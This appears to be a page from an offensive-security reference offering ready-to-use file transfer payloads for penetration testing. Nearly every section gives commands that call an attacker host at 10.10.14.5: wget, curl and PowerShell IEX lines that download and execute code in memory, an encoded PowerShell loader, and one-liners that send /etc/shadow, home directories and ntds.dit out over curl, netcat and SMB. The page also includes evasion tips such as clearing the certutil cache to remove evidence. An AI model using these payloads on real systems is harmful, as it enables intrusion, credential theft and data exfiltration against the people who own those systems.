---
title: Payloads Sample
description: Ready-to-use file transfer payloads for moving tools between attacker and target machines across Linux, Windows, and cross-platform environments.
navigation:
  icon: i-lucide-file-up
  title: File Transfers
---

File transfer is one of the most fundamental operations during penetration testing. Whether you need to deliver enumeration scripts, move compiled exploits, or exfiltrate sensitive data — having reliable transfer payloads ready is essential.

This reference provides **copy-paste-ready payloads** organized by platform, protocol, and use case.

::note
Replace `10.10.14.5` with your attacker IP and adjust filenames as needed. All payloads assume default ports unless otherwise noted.
::

---

## :icon{name="i-lucide-server"} Hosting — Attacker Setup

Before transferring anything to a target, you need to **serve files** from your attack machine. These are the quickest methods to spin up a file server.

### Python HTTP Server

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Attacker" color="neutral"}
  :badge{label="Linux" color="green"}
  :badge{label="HTTP" color="blue"}
  :badge{label="Quick Setup" color="orange"}
  :badge{label="Pre-installed" color="purple"}
::

![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)

Python is pre-installed on virtually every Linux distribution and penetration testing OS. The built-in `http.server` module turns any directory into a web server with a single command. This is the **go-to method** for most engagements.

Port **80** is recommended because it blends with normal HTTP traffic and is rarely blocked by firewalls. Port **443** is another safe choice if you need HTTPS simulation.

::code-collapse

```bash [Python 3 — Recommended]
# Serve current directory on port 80
python3 -m http.server 80

# Serve on custom port
python3 -m http.server 8443

# Serve a specific directory
python3 -m http.server 80 --directory /opt/payloads

# Bind to specific interface only
python3 -m http.server 80 --bind 10.10.14.5

# Background the server
python3 -m http.server 80 --directory /opt/payloads &
```

```bash [Python 2 — Legacy]
# Legacy systems still running Python 2
python -m SimpleHTTPServer 80
python -m SimpleHTTPServer 8080
```

::

::tip
Always serve on **port 80 or 443** — these ports pass through most firewalls and generate less suspicion in traffic logs.
::

::card-group
  ::card
  ---
  title: http.server — Python Docs
  icon: i-simple-icons-python
  to: https://docs.python.org/3/library/http.server.html
  target: _blank
  ---
  Official Python documentation for the built-in HTTP server module.
  ::
::

---

### PHP / Ruby / Busybox HTTP

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Attacker" color="neutral"}
  :badge{label="Linux" color="green"}
  :badge{label="HTTP" color="blue"}
  :badge{label="Alternatives" color="orange"}
::

![PHP](https://img.shields.io/badge/PHP-777BB4?style=for-the-badge&logo=php&logoColor=white) ![Ruby](https://img.shields.io/badge/Ruby-CC342D?style=for-the-badge&logo=ruby&logoColor=white)

When Python is unavailable, PHP, Ruby, and Busybox all provide single-command HTTP servers. PHP's server also supports handling **upload scripts** for bidirectional file transfers.

```bash [PHP]
php -S 0.0.0.0:80
php -S 0.0.0.0:8080 -t /opt/payloads
```

```bash [Ruby]
ruby -run -e httpd . -p 80
```

```bash [Busybox]
busybox httpd -f -p 80 -h /opt/payloads
```

---

### SMB Server (Impacket)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Attacker" color="neutral"}
  :badge{label="Linux → Windows" color="green"}
  :badge{label="SMB" color="blue"}
  :badge{label="Impacket" color="orange"}
  :badge{label="Best for Windows" color="red"}
  :badge{label="No Download Needed" color="purple"}
::

![Impacket](https://img.shields.io/badge/Impacket-DC382D?style=for-the-badge&logo=python&logoColor=white)

SMB is the **optimal transfer method for Windows targets**. Files can be accessed directly from the UNC path (`\\IP\share\file.exe`) without copying to disk, or moved with built-in `copy` commands. Windows treats SMB shares like local network drives.

Modern Windows 10/11 systems **block unauthenticated guest access** by default. Always use the authenticated variant to avoid connection errors.

```bash [Without Authentication]
# Basic SMB share — may fail on Windows 10+
impacket-smbserver share /opt/payloads -smb2support
```

```bash [With Authentication — Recommended]
# Authenticated share — works on all modern Windows
impacket-smbserver share /opt/payloads -smb2support -user hacker -password hacker123
```

::warning
Windows 10/11 default security policy blocks unauthenticated SMB guest access. If you see **"You can't access this shared folder"**, switch to the authenticated variant with `-user` and `-password` flags.
::

::card-group
  ::card
  ---
  title: Impacket — GitHub
  icon: i-simple-icons-github
  to: https://github.com/fortra/impacket
  target: _blank
  ---
  Impacket collection of Python classes for working with network protocols including SMB.
  ::

  ::card
  ---
  title: Impacket — smbserver.py
  icon: i-lucide-book-open
  to: https://tools.thehacker.recipes/impacket/examples/smbserver.py
  target: _blank
  ---
  Detailed usage reference for Impacket's SMB server module.
  ::
::

---

### FTP Server

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Attacker" color="neutral"}
  :badge{label="Both" color="green"}
  :badge{label="FTP" color="blue"}
  :badge{label="Upload + Download" color="orange"}
  :badge{label="pyftpdlib" color="purple"}
::

![FTP](https://img.shields.io/badge/FTP-009639?style=for-the-badge&logo=files&logoColor=white)

FTP is useful when HTTP and SMB are blocked. The `pyftpdlib` Python library creates a full-featured FTP server instantly. Use `-w` flag to enable **write access** for receiving files (exfiltration).

```bash [pyftpdlib]
# Install
pip3 install pyftpdlib

# Anonymous read-only
python3 -m pyftpdlib -p 21 -d /opt/payloads

# Anonymous with write access (upload enabled)
python3 -m pyftpdlib -p 21 -d /opt/payloads -w

# With authentication
python3 -m pyftpdlib -p 21 -u ftpuser -P ftppass -d /opt/payloads -w
```

::card-group
  ::card
  ---
  title: pyftpdlib — GitHub
  icon: i-simple-icons-github
  to: https://github.com/giampaolo/pyftpdlib
  target: _blank
  ---
  Python FTP server library — extremely high level, easy to use.
  ::
::

---

### WebDAV / TFTP / Netcat / OpenSSL Servers

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Attacker" color="neutral"}
  :badge{label="Multiple Protocols" color="blue"}
  :badge{label="Specialized" color="orange"}
::

Additional hosting methods for specific situations where HTTP, SMB, and FTP are unavailable or blocked.

::code-collapse

```bash [WebDAV Server]
# Install wsgidav
pip3 install wsgidav

# Anonymous read-write WebDAV share
wsgidav --host 0.0.0.0 --port 80 --root /opt/payloads --auth anonymous
```

```bash [TFTP Server]
# Using atftpd (UDP port 69)
sudo apt install atftpd -y
sudo atftpd --daemon --port 69 /opt/payloads

# Python alternative
pip3 install ptftpd
ptftpd -p 69 -r /opt/payloads eth0
```

```bash [Netcat — Serve Single File]
# Send file to first connection then close
nc -lvnp 443 < payload.elf

# Keep listening with ncat
ncat --send-only -lvnp 443 < payload.elf
```

```bash [OpenSSL — Encrypted Server]
# Generate self-signed certificate
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 1 -out cert.pem -subj '/CN=a'

# Serve file over SSL/TLS
openssl s_server -quiet -accept 443 -cert cert.pem -key key.pem < payload.elf
```

::

---

### Upload Receiver (Exfiltration Listener)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Attacker" color="neutral"}
  :badge{label="Receive" color="blue"}
  :badge{label="Exfiltration" color="red"}
  :badge{label="Listener" color="orange"}
::

Set up a listener on your attacker machine to **receive files** uploaded from the target during exfiltration.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Netcat"}
  ```bash [Terminal]
  # Listen and save incoming data to file
  nc -lvnp 443 > loot.tar.gz
  ```
  :::

  :::tabs-item{icon="i-simple-icons-php" label="PHP Upload"}
  ```php [upload.php]
  <?php
  $uploadDir = '/tmp/uploads/';
  if (!is_dir($uploadDir)) {
      mkdir($uploadDir, 0755, true);
  }

  $fileName  = basename($_FILES['file']['name']);
  $targetPath = $uploadDir . $fileName;

  if (move_uploaded_file($_FILES['file']['tmp_name'], $targetPath)) {
      echo "[+] Received: " . $fileName . "\n";
  } else {
      echo "[-] Upload failed.\n";
  }
  ?>
  ```

  ```bash [Start Server]
  mkdir -p /tmp/uploads
  php -S 0.0.0.0:80
  ```
  :::
::

---

## :icon{name="i-lucide-terminal"} Linux Target — Download Payloads

### wget

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Download" color="blue"}
  :badge{label="HTTP/HTTPS/FTP" color="orange"}
  :badge{label="Most Common" color="red"}
  :badge{label="Pre-installed" color="purple"}
::

![wget](https://img.shields.io/badge/wget-333333?style=for-the-badge&logo=gnu&logoColor=white)

`wget` is the **most reliable** download utility on Linux, available on nearly every distribution by default. It supports HTTP, HTTPS, and FTP protocols with built-in features for resuming interrupted downloads, recursive mirroring, and custom headers.

The `-q -O -` combination is especially powerful — it downloads silently and pipes output directly to a shell for **fileless execution**, leaving no payload on disk.

::code-collapse

```bash [Download to Disk]
# Basic download — saves to current directory
wget http://10.10.14.5/linpeas.sh

# Save with custom filename and path
wget http://10.10.14.5/linpeas.sh -O /tmp/lp.sh

# Silent download — no progress output
wget http://10.10.14.5/linpeas.sh -q -O /tmp/lp.sh

# Resume interrupted download
wget -c http://10.10.14.5/large_file.tar.gz

# Download with authentication
wget --user=admin --password=secret http://10.10.14.5/payload.elf

# Ignore SSL certificate errors
wget --no-check-certificate https://10.10.14.5/payload.elf

# Custom User-Agent for evasion
wget -U "Mozilla/5.0 (X11; Linux x86_64)" http://10.10.14.5/payload.elf

# Recursive download — mirror entire directory
wget -r -np http://10.10.14.5/tools/
```

```bash [Download + Execute — Fileless]
# Download and pipe directly to bash — no file on disk
wget http://10.10.14.5/linpeas.sh -q -O - | bash

# Download and execute with arguments
wget http://10.10.14.5/script.sh -q -O - | bash -s -- --thorough

# Silent fileless execution
wget -q -O- http://10.10.14.5/enum.sh | sh
```

::

::caution
Fileless execution (`wget -O - | bash`) runs code **directly in memory** without touching disk. While stealthy, this is dangerous — always verify scripts before executing.
::

::card-group
  ::card
  ---
  title: wget Manual
  icon: i-lucide-book-open
  to: https://www.gnu.org/software/wget/manual/wget.html
  target: _blank
  ---
  GNU wget complete reference manual with all options and configuration.
  ::
::

---

### curl

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Windows" color="blue"}
  :badge{label="Download + Upload" color="orange"}
  :badge{label="HTTP/S/FTP/SCP" color="red"}
  :badge{label="Versatile" color="purple"}
::

![curl](https://img.shields.io/badge/curl-073551?style=for-the-badge&logo=curl&logoColor=white)

`curl` is the **Swiss Army knife** of file transfers, supporting over 25 protocols including HTTP, HTTPS, FTP, SCP, SFTP, TFTP, and more. It's available on both Linux and modern Windows (10+), making it one of the most portable transfer tools.

Unlike `wget`, `curl` outputs to **stdout by default** — making it ideal for piping into other commands. Use `-o` or `-O` to save to a file instead.

::tabs
  :::tabs-item{icon="i-lucide-download" label="Download"}
  ```bash [Download to Disk]
  # Output to stdout (for piping)
  curl http://10.10.14.5/linpeas.sh

  # Save to specific file
  curl http://10.10.14.5/linpeas.sh -o /tmp/linpeas.sh

  # Save with remote filename
  curl -O http://10.10.14.5/linpeas.sh

  # Silent mode — suppress progress bar
  curl -s http://10.10.14.5/linpeas.sh -o /tmp/linpeas.sh

  # Follow redirects
  curl -L http://10.10.14.5/payload -o payload

  # Ignore SSL certificate errors
  curl -k https://10.10.14.5/payload.elf -o payload.elf

  # With HTTP authentication
  curl -u admin:password http://10.10.14.5/payload.elf -o payload.elf

  # Custom headers
  curl -H "Authorization: Bearer tok3n" http://10.10.14.5/secret.txt

  # Custom User-Agent
  curl -A "Mozilla/5.0" http://10.10.14.5/payload.elf -o payload.elf
  ```

  ```bash [Download + Execute — Fileless]
  # Pipe directly to bash
  curl http://10.10.14.5/linpeas.sh | bash

  # Silent fileless execution
  curl -s http://10.10.14.5/linpeas.sh | bash

  # With arguments
  curl -s http://10.10.14.5/script.sh | bash -s -- --arg1 --arg2
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Upload / Exfil"}
  ```bash [Upload from Target]
  # POST file upload
  curl -X POST http://10.10.14.5/upload -F "file=@/etc/passwd"
  curl -X POST http://10.10.14.5/upload -F "file=@/etc/shadow"

  # PUT upload
  curl -T /etc/shadow http://10.10.14.5/upload/shadow

  # PUT to WebDAV
  curl -T loot.tar.gz http://10.10.14.5/upload/loot.tar.gz

  # Raw body POST
  curl -X POST -d @/etc/passwd http://10.10.14.5/exfil

  # FTP upload
  curl -u admin:pass -T data.txt ftp://10.10.14.5/data.txt

  # Compress and exfil in one line
  tar czf - /home/ /etc/shadow /root/ 2>/dev/null | curl -X POST --data-binary @- http://10.10.14.5/loot.tar.gz
  ```
  :::
::

::card-group
  ::card
  ---
  title: curl Manual
  icon: i-lucide-book-open
  to: https://curl.se/docs/manpage.html
  target: _blank
  ---
  Complete curl man page — all flags, protocols, and examples.
  ::

  ::card
  ---
  title: Everything curl
  icon: i-lucide-book-open
  to: https://everything.curl.dev/
  target: _blank
  ---
  The comprehensive book covering all aspects of curl usage.
  ::
::

---

### Netcat / Ncat

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Both Directions" color="blue"}
  :badge{label="Raw TCP" color="orange"}
  :badge{label="No Protocol Overhead" color="red"}
  :badge{label="No Auth" color="purple"}
::

![Netcat](https://img.shields.io/badge/Netcat-000000?style=for-the-badge&logo=gnubash&logoColor=white)

Netcat transfers files over **raw TCP** with zero protocol overhead — no HTTP headers, no FTP commands, just pure data. This makes it ideal when the target has minimal tooling or when you need maximum simplicity.

`ncat` (from the Nmap project) adds **SSL/TLS encryption** support for secure transfers over untrusted networks.

::tabs
  :::tabs-item{icon="i-lucide-download" label="Download to Target"}
  ```bash [Method 1 — Attacker sends]
  # ATTACKER: serve file on port 443
  nc -lvnp 443 < payload.elf

  # TARGET: connect and receive
  nc 10.10.14.5 443 > payload.elf
  chmod +x payload.elf
  ```

  ```bash [Method 2 — Target listens]
  # TARGET: listen for incoming file
  nc -lvnp 4444 > payload.elf

  # ATTACKER: push file to target
  nc TARGET_IP 4444 < payload.elf
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Upload / Exfil"}
  ```bash [Exfiltrate to Attacker]
  # ATTACKER: listen for incoming data
  nc -lvnp 443 > loot.tar.gz

  # TARGET: send single file
  nc 10.10.14.5 443 < /tmp/loot.tar.gz

  # TARGET: pipe command output
  cat /etc/shadow | nc 10.10.14.5 443

  # TARGET: compress and send directory
  tar czf - /home /etc/shadow 2>/dev/null | nc 10.10.14.5 443

  # TARGET: find and exfil sensitive files list
  find / -name "*.conf" -o -name "id_rsa" 2>/dev/null | nc 10.10.14.5 443
  ```
  :::

  :::tabs-item{icon="i-lucide-lock" label="Ncat — Encrypted"}
  ```bash [SSL/TLS Transfer]
  # ATTACKER: SSL listener
  ncat --ssl -lvnp 443 > received_file.txt

  # TARGET: send over encrypted channel
  ncat --ssl 10.10.14.5 443 < /etc/shadow
  ```
  :::
::

::note
Netcat transfers have **no progress indicator** and no built-in integrity checking. Always run `md5sum` or `sha256sum` on both ends after transfer to verify the file arrived intact.
::

---

### SCP / SFTP

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Both Directions" color="blue"}
  :badge{label="SSH" color="orange"}
  :badge{label="Encrypted" color="red"}
  :badge{label="Requires Credentials" color="purple"}
::

![SSH](https://img.shields.io/badge/SSH-000000?style=for-the-badge&logo=openssh&logoColor=white)

SCP (Secure Copy Protocol) and SFTP (SSH File Transfer Protocol) leverage existing **SSH access** for encrypted file transfers. These are the most **reliable and secure** methods when SSH credentials or keys are available.

SCP is best for quick one-off transfers. SFTP provides an interactive session for browsing directories and transferring multiple files.

::code-collapse

```bash [SCP — Secure Copy]
# Download FROM target to attacker
scp user@target:/etc/passwd ./passwd_copy

# Upload TO target from attacker
scp linpeas.sh user@target:/tmp/linpeas.sh

# Recursive directory copy
scp -r ./tools/ user@target:/tmp/tools/

# Custom SSH port
scp -P 2222 payload.elf user@target:/tmp/

# Using SSH key instead of password
scp -i id_rsa linpeas.sh user@target:/tmp/
```

```bash [SFTP — Interactive Session]
sftp user@target
# sftp> put linpeas.sh /tmp/
# sftp> get /etc/shadow ./
# sftp> ls -la /home/
# sftp> bye

# SFTP with key
sftp -i id_rsa user@target
```

::

---

### /dev/tcp (Bash Built-in)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Download" color="blue"}
  :badge{label="Bash Only" color="orange"}
  :badge{label="No External Tools" color="red"}
  :badge{label="Last Resort" color="purple"}
::

When `wget`, `curl`, `nc`, and all scripting languages are unavailable, Bash's built-in `/dev/tcp` pseudo-device can establish raw TCP connections. This is a **last resort** technique that works when everything else has been stripped from the system.

::warning
`/dev/tcp` is a **Bash-specific feature**. It does NOT work in `sh`, `dash`, `zsh`, or other shells. Always verify your shell first with `echo $0` or `echo $SHELL`.
::

```bash [/dev/tcp]
# Simple file download
cat < /dev/tcp/10.10.14.5/80 > payload.elf

# Full HTTP GET request via /dev/tcp
exec 3<>/dev/tcp/10.10.14.5/80
echo -e "GET /linpeas.sh HTTP/1.1\r\nHost: 10.10.14.5\r\nConnection: close\r\n\r\n" >&3
cat <&3 > linpeas.sh
exec 3>&-

# Alternative syntax
bash -c 'cat < /dev/tcp/10.10.14.5/443 > /tmp/payload.elf'
```

---

### OpenSSL Client

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Download" color="blue"}
  :badge{label="Encrypted" color="orange"}
  :badge{label="Built-in" color="red"}
::

`openssl` is installed on most Linux systems for SSL/TLS operations. Its `s_client` subcommand can act as a network client for **encrypted file transfers** when other tools are unavailable.

```bash [OpenSSL Client]
# Download from SSL server
# ATTACKER: openssl s_server -quiet -accept 443 -cert cert.pem -key key.pem < payload.elf
openssl s_client -quiet -connect 10.10.14.5:443 > /tmp/payload.elf
```

---

### Scripting Language One-Liners

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Linux" color="green"}
  :badge{label="Download" color="blue"}
  :badge{label="Python" color="orange"}
  :badge{label="Perl" color="red"}
  :badge{label="Ruby" color="pink"}
  :badge{label="PHP" color="purple"}
  :badge{label="LOLBins" color="neutral"}
::

![Python](https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white) ![Perl](https://img.shields.io/badge/Perl-39457E?style=flat-square&logo=perl&logoColor=white) ![Ruby](https://img.shields.io/badge/Ruby-CC342D?style=flat-square&logo=ruby&logoColor=white) ![PHP](https://img.shields.io/badge/PHP-777BB4?style=flat-square&logo=php&logoColor=white) ![Node.js](https://img.shields.io/badge/Node.js-5FA04E?style=flat-square&logo=nodedotjs&logoColor=white) ![Lua](https://img.shields.io/badge/Lua-2C2D72?style=flat-square&logo=lua&logoColor=white)

When standard download tools (`wget`, `curl`, `nc`) are removed or blocked, **scripting language interpreters** often remain installed. Each language provides network capabilities that can be used for file downloads.

These are **living-off-the-land** techniques — using tools already present on the system.

::code-collapse

```bash [Python 3]
# Download to file
python3 -c 'import urllib.request; urllib.request.urlretrieve("http://10.10.14.5/linpeas.sh", "/tmp/linpeas.sh")'

# Download and execute in memory
python3 -c 'import urllib.request; exec(urllib.request.urlopen("http://10.10.14.5/payload.py").read())'
```

```bash [Python 2]
python -c 'import urllib; urllib.urlretrieve("http://10.10.14.5/linpeas.sh", "/tmp/linpeas.sh")'
```

```bash [Perl]
# With LWP module
perl -e 'use LWP::Simple; getstore("http://10.10.14.5/linpeas.sh", "/tmp/linpeas.sh")'

# Without LWP — using HTTP::Tiny (core module)
perl -MHTTP::Tiny -e '$r=HTTP::Tiny->new->get("http://10.10.14.5/linpeas.sh"); open(F,">/tmp/linpeas.sh"); print F $r->{content}'
```

```bash [Ruby]
ruby -e 'require "net/http"; File.write("/tmp/linpeas.sh", Net::HTTP.get(URI("http://10.10.14.5/linpeas.sh")))'
```

```bash [PHP]
# Download to file
php -r 'file_put_contents("/tmp/linpeas.sh", file_get_contents("http://10.10.14.5/linpeas.sh"));'

# Download and execute
php -r 'system(file_get_contents("http://10.10.14.5/cmd.sh"));'
```

```bash [Node.js]
node -e 'require("http").get("http://10.10.14.5/linpeas.sh", r => { let d=""; r.on("data",c=>d+=c); r.on("end",()=>require("fs").writeFileSync("/tmp/linpeas.sh",d)) })'
```

```bash [Lua]
lua -e 'local h=require("socket.http"); local b=h.request("http://10.10.14.5/payload"); local f=io.open("/tmp/payload","w"); f:write(b); f:close()'
```

```bash [awk — Extreme Last Resort]
awk 'BEGIN{
  s="/inet/tcp/0/10.10.14.5/80"
  print "GET /linpeas.sh" |& s
  while((s |& getline line) > 0) print line > "/tmp/linpeas.sh"
  close(s)
}'
```

::

::card-group
  ::card
  ---
  title: GTFOBins — File Download
  icon: i-lucide-terminal
  to: https://gtfobins.github.io/#+file%20download
  target: _blank
  ---
  Complete reference of Linux binaries that can be used for file downloads — searchable by capability.
  ::
::

---

## :icon{name="i-lucide-monitor"} Windows Target — Download Payloads

### PowerShell — Download to Disk

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Download" color="green"}
  :badge{label="PowerShell" color="orange"}
  :badge{label="HTTP/HTTPS" color="red"}
  :badge{label="Most Common" color="purple"}
::

![PowerShell](https://img.shields.io/badge/PowerShell-5391FE?style=for-the-badge&logo=powershell&logoColor=white)

PowerShell is the **primary file transfer method** on modern Windows systems. It provides multiple approaches through cmdlets (`Invoke-WebRequest`) and .NET classes (`System.Net.WebClient`), each with different detection profiles and capabilities.

`Invoke-WebRequest` (alias `iwr`, `wget`, `curl`) is the simplest approach. `System.Net.WebClient` offers more control and is slightly less detected in some environments.

::code-collapse

```powershell [Invoke-WebRequest (IWR)]
# Standard download
Invoke-WebRequest -Uri http://10.10.14.5/winPEAS.exe -OutFile C:\Windows\Temp\wp.exe

# Short alias
iwr http://10.10.14.5/winPEAS.exe -o C:\Windows\Temp\wp.exe

# PowerShell aliases for wget/curl (NOT the real binaries)
wget http://10.10.14.5/nc.exe -OutFile nc.exe
curl http://10.10.14.5/nc.exe -OutFile nc.exe
```

```powershell [System.Net.WebClient]
# DownloadFile method
(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.5/winPEAS.exe','C:\Windows\Temp\wp.exe')

# Variable form
$wc = New-Object Net.WebClient
$wc.DownloadFile('http://10.10.14.5/payload.exe','C:\Temp\payload.exe')
```

```powershell [With Proxy Support]
# Use system proxy — required in corporate environments
$wc = New-Object Net.WebClient
$wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
$wc.DownloadFile('http://10.10.14.5/payload.exe','C:\Temp\payload.exe')
```

```powershell [Ignore SSL Certificate Errors]
# Bypass SSL validation for self-signed certs
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
iwr https://10.10.14.5/payload.exe -o C:\Windows\Temp\payload.exe
```

::

---

### PowerShell — Fileless Execution

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Fileless" color="red"}
  :badge{label="In-Memory" color="orange"}
  :badge{label="Download + Execute" color="green"}
  :badge{label="AMSI Monitored" color="purple"}
::

Fileless execution downloads a PowerShell script and runs it **directly in memory** without writing to disk. This is critical for running tools like `Invoke-Mimikatz`, `PowerView`, `Sherlock`, and other PowerShell-based payloads that would be detected by antivirus on disk.

`Invoke-Expression` (IEX) evaluates a string as a PowerShell command. Combined with `DownloadString()` or `IWR`, it downloads and executes scripts in a single operation.

::code-collapse

```powershell [IEX Methods]
# WebClient + IEX — most common
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/Invoke-Mimikatz.ps1')

# IWR + IEX
IEX (iwr http://10.10.14.5/PowerView.ps1 -UseBasicParsing).Content

# Pipeline IEX
(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1') | IEX
```

```powershell [From cmd.exe]
# When you have cmd.exe but need PowerShell execution
powershell -ep bypass -c "IEX (iwr http://10.10.14.5/script.ps1 -UseBasicParsing)"
powershell -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/payload.ps1')"
```

```powershell [Encoded Command — Obfuscation]
:: Generate encoded command on attacker (Linux):
:: echo -n "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5/p.ps1')" | iconv -t UTF-16LE | base64 -w0

:: Execute encoded command on target:
powershell -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4ANQAvAHAALgBwAHMAMQAnACkA
```

::

::caution
`IEX` and `DownloadString` are **heavily monitored** by:
- **AMSI** (Antimalware Scan Interface) — scans script content in memory
- **Windows Defender** — signature-based detection
- **EDR solutions** — behavioral detection

Use obfuscation, AMSI bypass, or alternative methods in hardened environments.
::

---

### PowerShell — Upload / Exfiltration

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Upload" color="green"}
  :badge{label="Exfiltration" color="red"}
  :badge{label="PowerShell" color="orange"}
::

```powershell [Upload Methods]
# POST upload
Invoke-WebRequest -Uri http://10.10.14.5/upload -Method POST -InFile C:\Users\admin\secrets.txt

# WebClient UploadFile
(New-Object Net.WebClient).UploadFile('http://10.10.14.5/upload','C:\data.txt')

# Upload string content
(New-Object Net.WebClient).UploadString('http://10.10.14.5/exfil', (Get-Content C:\flag.txt))

# Invoke-RestMethod
Invoke-RestMethod -Uri http://10.10.14.5/upload.php -Method Post -InFile C:\loot.zip
```

---

### certutil

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Download" color="green"}
  :badge{label="LOLBin" color="orange"}
  :badge{label="Built-in" color="red"}
  :badge{label="All Versions" color="neutral"}
  :badge{label="HIGH Detection" color="purple"}
::

![certutil](https://img.shields.io/badge/certutil-0078D4?style=for-the-badge&logo=windows&logoColor=white)

`certutil.exe` is a **built-in Windows binary** for certificate management that can be abused for file downloads and Base64 operations. It's available on **every Windows version** from XP to 11, making it universally reliable.

However, `certutil` used for downloads is one of the **most detected LOLBin techniques** — virtually every AV/EDR product flags it immediately.

```powershell [certutil — Download]
:: Basic download
certutil -urlcache -split -f http://10.10.14.5/winPEAS.exe C:\Windows\Temp\wp.exe

:: Download and verify hash
certutil -urlcache -split -f http://10.10.14.5/payload.exe payload.exe
certutil -hashfile payload.exe MD5

:: Clean URL cache after download (remove evidence)
certutil -urlcache -split -f http://10.10.14.5/payload.exe delete
```

::warning
`certutil -urlcache` for downloading files triggers **HIGH-CONFIDENCE ALERTS** across virtually all security products — Windows Defender, CrowdStrike, Carbon Black, SentinelOne, Cortex XDR. Use only when stealth is not a concern (e.g., CTF challenges).
::

---

### bitsadmin

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="Download" color="green"}
  :badge{label="LOLBin" color="orange"}
  :badge{label="Background Transfer" color="red"}
  :badge{label="Survives Reboot" color="purple"}
::

`bitsadmin` manages the **Background Intelligent Transfer Service (BITS)** — the same service Windows Update uses internally. BITS transfers run asynchronously and can survive system reboots, making them useful for slow or unreliable connections.

The PowerShell `Start-BitsTransfer` cmdlet provides a cleaner interface to the same underlying service.

```powershell [bitsadmin]
:: Classic bitsadmin syntax
bitsadmin /transfer job1 /download /priority high http://10.10.14.5/payload.exe C:\Windows\Temp\payload.exe
```

```powershell [Start-BitsTransfer — PowerShell]
# Synchronous download
Start-BitsTransfer -Source http://10.10.14.5/payload.exe -Destination C:\Windows\Temp\payload.exe

# Asynchronous (background) download
Start-BitsTransfer -Source http://10.10.14.5/payload.exe -Destination C:\Temp\payload.exe -Asynchronous
```

---

### curl.exe (Native Windows)

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows 10+" color="blue"}
  :badge{label="Download + Upload" color="green"}
  :badge{label="Built-in" color="orange"}
  :badge{label="Less Detected" color="red"}
  :badge{label="Recommended" color="purple"}
::

![curl](https://img.shields.io/badge/curl.exe-073551?style=for-the-badge&logo=curl&logoColor=white)

Windows 10 (version 1803+) and Windows Server 2019+ include a **native curl.exe binary**. This is increasingly the **best choice** for file transfers on modern Windows because it's:
- Less monitored than `certutil` or `PowerShell IEX`
- A legitimate system binary
- Feature-rich with full curl capabilities

::note
Always use `curl.exe` (with `.exe`) in PowerShell to invoke the real binary. Plain `curl` without the extension is a PowerShell **alias** for `Invoke-WebRequest`, which behaves completely differently.
::

```powershell [curl.exe]
:: Download file
curl.exe http://10.10.14.5/payload.exe -o C:\Windows\Temp\payload.exe

:: Silent download
curl.exe -s http://10.10.14.5/payload.exe -o payload.exe

:: Ignore SSL certificate errors
curl.exe -k https://10.10.14.5/payload.exe -o payload.exe

:: Upload file (exfiltration)
curl.exe -X POST -F "file=@C:\Users\admin\secrets.txt" http://10.10.14.5/upload
```

---

### SMB — Access from Share

::div{.flex.gap-2.flex-wrap.my-4}
  :badge{label="Windows" color="blue"}
  :badge{label="SMB" color="green"}
  :badge{label="Direct Execution" color="orange"}
  :badge{label="No Download" color="red"}
  :badge{label="Exfiltration" color="purple"}
::

![SMB](https://img.shields.io/badge/SMB-0078D4?style=for-the-badge&logo=windows&logoColor=white)

Access files directly from an Impacket SMB share. The most powerful feature is **direct execution** — running an executable straight from the UNC path without ever copying it to the target's filesystem.

```powershell [SMB Access]
:: Connect with authentication
net use Z: \\10.10.14.5\share /user:hacker hacker123

:: Copy file from share to target
copy \\10.10.14.5\share\nc.exe C:\Windows\Temp\nc.exe

:: DIRECT EXECUTION — run from share without copying
\\10.10.14.5\share\mimikatz.exe
\\10.10.14.5\share\SharpHound.exe --CollectionMethods All

:: EXFILTRATION — copy files TO share
copy C:\Users\admin\Desktop\secrets.txt \\10.10.14.5\share\
copy C:\Windows\NTDS\ntds.dit \\10.10.14.5\share\

:: Disconnect when finished
net use Z: /delete
```

::tip
